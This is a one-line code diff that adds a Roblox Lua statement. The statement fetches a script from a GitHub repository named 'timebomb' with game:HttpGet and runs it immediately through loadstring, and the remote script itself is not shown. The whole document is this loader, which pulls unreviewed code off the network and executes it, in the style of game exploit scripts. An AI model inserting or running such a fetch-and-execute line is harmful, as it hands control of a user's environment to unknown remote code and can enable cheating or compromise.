@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/llarp3511-wq/timebomb/refs/heads/main/timebomb"))()
